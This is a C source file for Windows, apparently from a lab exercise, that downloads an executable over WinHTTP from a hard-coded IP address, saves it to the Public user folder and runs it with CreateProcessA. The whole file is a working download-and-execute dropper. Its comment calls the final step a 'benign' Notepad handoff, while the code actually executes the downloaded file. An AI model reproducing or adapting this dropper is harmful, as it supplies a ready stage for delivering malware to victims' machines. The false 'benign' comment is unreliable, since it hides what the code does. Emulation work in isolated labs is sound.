#include <windows.h>
#include <winhttp.h>
#include <stdio.h>

#pragma comment(lib, "winhttp.lib")

int main()
{
    HINTERNET hSession = NULL;
    HINTERNET hConnect = NULL;
    HINTERNET hRequest = NULL;
    HANDLE hFile = INVALID_HANDLE_VALUE;

    BOOL bResults = FALSE;
    DWORD bytesRead = 0;
    DWORD bytesWritten = 0;

    // Controlled lab target
    LPCWSTR userAgent = L"A03_2_WinHTTP/1.0";
    LPCWSTR serverName = L"192.168.67.5";
    INTERNET_PORT port = 80;
    LPCWSTR path = L"/A03_2_dropped_exe.exe"; // host custom executable

    const char *localFile = R"(C:\Users\Public\A03_2_dropped_exe.exe)";
    ;

    // Create local output file
    hFile = CreateFileA(
        localFile,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("CreateFileA failed: %lu\n", GetLastError());
        return 1;
    }

    // 1) Open WinHTTP session
    hSession = WinHttpOpen(
        userAgent,
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS,
        0);

    if (!hSession)
    {
        printf("WinHttpOpen failed: %lu\n", GetLastError());
        CloseHandle(hFile);
        return 1;
    }

    // 2) Connect to server
    hConnect = WinHttpConnect(
        hSession,
        serverName,
        port,
        0);

    if (!hConnect)
    {
        printf("WinHttpConnect failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hSession);
        CloseHandle(hFile);
        return 1;
    }

    // 3) Create GET request
    hRequest = WinHttpOpenRequest(
        hConnect,
        L"GET",
        path,
        NULL,
        WINHTTP_NO_REFERER,
        WINHTTP_DEFAULT_ACCEPT_TYPES,
        0);

    if (!hRequest)
    {
        printf("WinHttpOpenRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        CloseHandle(hFile);
        return 1;
    }

    // 4) Send request
    bResults = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,
        0,
        WINHTTP_NO_REQUEST_DATA,
        0,
        0,
        0);

    if (!bResults)
    {
        printf("WinHttpSendRequest failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        CloseHandle(hFile);
        return 1;
    }

    // 5) Receive response
    bResults = WinHttpReceiveResponse(hRequest, NULL);
    if (!bResults)
    {
        printf("WinHttpReceiveResponse failed: %lu\n", GetLastError());
        WinHttpCloseHandle(hRequest);
        WinHttpCloseHandle(hConnect);
        WinHttpCloseHandle(hSession);
        CloseHandle(hFile);
        return 1;
    }

    // 6) Read response body and write to disk
    do
    {
        char buffer[4096] = {0};

        bResults = WinHttpReadData(
            hRequest,
            buffer,
            sizeof(buffer),
            &bytesRead);

        if (!bResults)
        {
            printf("WinHttpReadData failed: %lu\n", GetLastError());
            break;
        }

        if (bytesRead == 0)
        {
            break;
        }

        if (!WriteFile(hFile, buffer, bytesRead, &bytesWritten, NULL))
        {
            printf("WriteFile failed: %lu\n", GetLastError());
            break;
        }

    } while (bytesRead > 0);

    CloseHandle(hFile);
    hFile = INVALID_HANDLE_VALUE;

    printf("Finished. Saved to %s\n", localFile);

    // 7) Safe execution handoff:
    // Launch a benign local process (Notepad) to open the downloaded file.
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);

    char cmdLine[] = R"(C:\Users\Public\A03_2_dropped_exe.exe)";
    ;

    if (CreateProcessA(
            NULL,
            cmdLine,
            NULL,
            NULL,
            FALSE,
            0,
            NULL,
            NULL,
            &si,
            &pi))
    {

        printf("Benign handoff performed via CreateProcessA.\n");
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }
    else
    {
        printf("CreateProcessA failed: %lu\n", GetLastError());
    }

    if (hRequest)
        WinHttpCloseHandle(hRequest);
    if (hConnect)
        WinHttpCloseHandle(hConnect);
    if (hSession)
        WinHttpCloseHandle(hSession);
    if (hFile != INVALID_HANDLE_VALUE)
        CloseHandle(hFile);

    return 0;
}